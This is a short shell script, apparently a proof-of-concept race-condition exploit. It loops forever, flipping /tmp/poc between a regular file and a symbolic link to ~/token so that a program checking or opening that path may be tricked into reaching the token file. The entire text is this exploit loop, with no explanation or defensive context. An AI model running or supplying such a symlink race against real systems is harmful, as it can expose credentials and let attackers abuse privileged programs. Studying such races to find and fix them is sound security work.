while true; do
        touch /tmp/poc
        rm -f /tmp/poc
        ln -s ~/token /tmp/poc
        rm -f /tmp/poc
done
